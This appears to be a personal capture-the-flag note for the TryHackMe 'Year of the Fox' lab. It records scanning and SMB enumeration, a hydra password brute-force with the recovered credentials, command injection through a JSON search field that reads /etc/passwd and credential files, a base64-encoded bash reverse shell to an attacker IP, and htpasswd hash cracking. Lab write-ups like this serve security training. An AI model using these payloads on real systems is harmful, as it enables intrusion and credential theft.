@@ -1,0 +1,153 @@
+THM - Year of the Fox (3 Oct 2022)
+Target	10.10.211.243
+Attack	10.10.36.242
+
+===================
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+
+Host is up (0.00024s latency).
+
+PORT    STATE SERVICE     VERSION
+80/tcp  open  http        Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=You want in? Gotta guess the password!
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
+MAC Address: 02:A2:D7:1B:C8:73 (Unknown)
+Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX
+
+Host script results:
+| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
+|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
+|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   YEAROFTHEFOX<00>     Flags: <group><active>
+|   YEAROFTHEFOX<1d>     Flags: <unique><active>
+|_  YEAROFTHEFOX<1e>     Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: year-of-the-fox
+|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
+|   Domain name: lan
+|   FQDN: year-of-the-fox.lan
+|_  System time: 2022-10-03T18:30:59+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-10-03 18:30:59
+|_  start_date: 1600-12-31 23:58:45
+
+enum4linux -a
+
+S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\fox (Local User)
+S-1-22-1-1001 Unix User\rascal (Local User)
+
+ ========================================== 
+|    Share Enumeration on 10.10.225.253    |
+ ========================================== 
+WARNING: The "syslog" option is deprecated
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	yotf            Disk      Fox's Stuff -- keep out!
+	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	YEAROFTHEFOX         YEAR-OF-THE-FOX
+
+[+] Attempting to map shares on 10.10.225.253
+//10.10.225.253/yotf	Mapping: DENIED, Listing: N/A
+//10.10.225.253/IPC$	[E] Can't understand response:
+WARNING: The "syslog" option is deprecated
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+***port 80 http server requires username and password
+used hydra to brute force a password for rascal
+(used burpsuite to identify basic authorization technique)
+
+root@ip-10-10-36-242:~# hydra -l rascal -P Tools/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100000.txt -f $IP http-get /
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-10-03 20:06:45
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
+[DATA] attacking http-get://10.10.202.179:80//
+[80][http-get] host: 10.10.202.179   login: rascal   password: blink182
+[80][http-get] host: 10.10.211.243   login: rascal   password: juice1
+[80][http-get] host: 10.10.201.77   login: rascal   password: knight1
+
+
+
+**website with a file search function
+POST /assets/php/search.php HTTP/1.1
+Host: year-of-the-fox.lan
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 19
+Origin: http://year-of-the-fox.lan
+Authorization: Basic cmFzY2FsOmJsaW5rMTgy
+Connection: close
+Referer: http://year-of-the-fox.lan/
+
+{"target":""}
+
+["creds2.txt","fox.txt","important-data.txt"]
+
+consider json eval injection attack
+
+| ; & $ > < ' \ ! >> #
+
+{"target":"\";cat /etc/passwd \""}
+
+
+"target":"\";ls /var/www/ \""
+["\/var\/www\/:","files","html","web-flag.txt"]
+
+
+"target":"\";cat /var/www/files/creds2.txt \""
+["LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX","UTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ="]
+
+c74341b26d29ad41da6cc68feedebd16110)
+
+
+"target":"\";cat /var/www/web-flag.txt \""
+THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
+
+base64 encoded /bin/bash -i >& /dev/tcp/10.10.57.220/9001 0>&1
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjU3LjIyMC85MDAxIDA+JjE=
+
+"target":"\";echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjU3LjIyMC85MDAxIDA+JjE= | base64 -d | bash; \""
+
+*** rev shell
+www-data
+
+ran linpeas.sh
+
+/etc/apache2/.htpasswd:$apr1$.5oWfF40$MnmLnAvAo27W/tn/B/6uF0
+this is apache 2 md5 --> ran john --> its knight1 from earlier
+
+
